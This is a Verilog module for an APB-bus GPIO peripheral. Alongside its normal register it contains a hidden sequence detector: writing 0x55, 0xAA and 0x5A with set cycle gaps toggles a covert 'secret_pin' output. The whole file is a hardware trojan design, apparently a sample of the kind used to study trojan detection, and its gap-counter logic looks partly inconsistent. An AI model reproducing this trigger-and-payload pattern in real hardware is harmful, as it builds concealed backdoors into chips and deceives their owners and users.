`timescale 1ns/1ps
module apb_gpio_with_secret_toggle (
    input  logic        pclk,
    input  logic        presetn,
    input  logic        psel,
    input  logic        penable,
    input  logic        pwrite,
    input  logic [31:0] paddr,
    input  logic [31:0] pwdata,
    output logic [31:0] prdata,
    output logic        pready,
    output logic        secret_pin
);

    reg [7:0]  gpio_reg;
    reg [1:0]  seq_state;  // 0=idle, 1=got_55, 2=got_AA
    reg [2:0]  gap_cnt;

    always @(posedge pclk or negedge presetn) begin
        if (!presetn) begin
            gpio_reg   <= 8'h00;
            seq_state  <= 0;
            gap_cnt    <= 0;
            prdata     <= 0;
            pready     <= 0;
            secret_pin <= 0;
        end else begin
            pready <= penable;

            // Default: hold PRDATA
            if (psel && penable && !pwrite && paddr[3:0]==0)
                prdata <= {24'h0, gpio_reg};

            if (psel && penable && pwrite && paddr[3:0]==0) begin
                gpio_reg <= pwdata[7:0];

                case (seq_state)
                    0: if (pwdata[7:0] == 8'h55) begin
                           seq_state <= 1;
                           gap_cnt   <= 0;
                       end
                    1: begin
                           if (gap_cnt == 3 && pwdata[7:0] == 8'hAA) begin
                               seq_state <= 2;
                               gap_cnt   <= 0;
                           end else if (gap_cnt != 3 || pwdata[7:0] != 8'hAA)
                               seq_state <= 0;
                       end
                    2: begin
                           if (gap_cnt == 3 && pwdata[7:0] == 8'h5A) begin
                               secret_pin <= ~secret_pin;
                               seq_state  <= 0;
                           end else
                               seq_state <= 0;
                       end
                endcase
            end

            if (seq_state != 0) begin
                if (gap_cnt < 7) gap_cnt <= gap_cnt + 1;
                else             seq_state <= 0;
            end
        end
    end
endmodule

